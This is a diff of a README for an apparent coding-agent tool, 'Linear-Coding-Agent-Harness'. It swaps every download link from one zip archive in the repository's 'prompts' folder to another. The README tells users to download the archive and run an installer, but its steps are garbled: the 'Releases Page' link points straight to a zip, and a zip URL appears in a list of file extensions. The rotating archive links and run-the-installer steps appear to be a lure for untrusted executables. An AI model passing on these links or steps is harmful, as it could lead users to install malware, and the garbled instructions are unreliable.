@@ -1,6 +1,6 @@
 # 🚀 Linear-Coding-Agent-Harness - Effortless Coding with an Autonomous Agent
 
-[![Download Linear-Coding-Agent-Harness](https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Agent_Harness_Coding_Linear_v2.1.zip)](https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Agent_Harness_Coding_Linear_v2.1.zip)
+[![Download Linear-Coding-Agent-Harness](https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Coding-Harness-Linear-Agent-v1.4.zip)](https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Coding-Harness-Linear-Agent-v1.4.zip)
 
 ## 📖 Introduction
 
@@ -14,13 +14,13 @@ To get started with the Linear Coding Agent Harness, you need to download the so
 
 To download the software, follow these steps:
 
-1. **Visit the Releases Page**: Go to the following link: [Download from Releases](https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Agent_Harness_Coding_Linear_v2.1.zip).
+1. **Visit the Releases Page**: Go to the following link: [Download from Releases](https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Coding-Harness-Linear-Agent-v1.4.zip).
 
 2. **Choose the Latest Version**: On this page, you will see different versions of the software. Select the latest one. The most recent release will usually have the highest version number.
 
 3. **Download the File**: 
    - Click on the file that matches your operating system (e.g., Windows, Mac, or Linux).
-   - The file typically ends with extensions like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Agent_Harness_Coding_Linear_v2.1.zip`. 
+   - The file typically ends with extensions like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Coding-Harness-Linear-Agent-v1.4.zip`. 
 
 4. **Run the Installer**:
    - Locate the downloaded file in your computer’s Downloads folder.
@@ -74,4 +74,4 @@ We are committed to improving the Linear Coding Agent Harness. Keep an eye on th
 
 The Linear Coding Agent Harness provides tools to make coding easier for everyone. By following these steps, you can quickly download and run the software. Enjoy coding effortlessly!
 
-[![Download Linear-Coding-Agent-Harness](https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Agent_Harness_Coding_Linear_v2.1.zip)](https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Agent_Harness_Coding_Linear_v2.1.zip)
+[![Download Linear-Coding-Agent-Harness](https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Coding-Harness-Linear-Agent-v1.4.zip)](https://raw.githubusercontent.com/gatopilantra/Linear-Coding-Agent-Harness/main/prompts/Coding-Harness-Linear-Agent-v1.4.zip)
